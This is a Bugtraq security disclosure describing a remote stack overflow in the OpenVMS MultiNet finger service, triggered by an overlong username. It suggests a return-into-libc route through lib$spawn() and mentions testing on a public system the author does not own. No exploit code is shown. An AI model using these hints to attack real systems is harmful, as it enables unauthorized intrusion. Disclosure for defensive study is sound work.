Subject: OpenVMS fingerd remote stack overflow


sup bugtraq.

Since a group of lads are giving a talk on Hacking OpenVMS at defcon I figured I'd release a vulnerability in the OpenVMS finger service (part of the MultiNet package) to give people a few days to figure out an exploit before the methods are documented for us by the guys giving the talk. (assume they will be)

The MultiNet finger service runs on port 79 by default (like other finger servers) and takes a username to query.  A long string (~250+ or so bytes) will cause
a stack overflow, giving control of a saved return address and hence the program counter (PC).  Demonstrated below on a public OpenVMS system..
(hopefully the owners won't mind since they seem to encourage OpenVMS hack attempts on their systems)

 etc..
-----------

For running arbitrary code...The main architectures running OpenVMS (Alpha, VAX) have Page Table Entries set such that the Fault-on-execute bit is set for 
the user stack...i.e. equivalent to a non-executable stack on other modern operating systems.

However this doesn't stop a "return-into-libc" type attack...library functions can be returned into.  One possible candidate is returning into the lib$spawn() library function.

Take it easy.
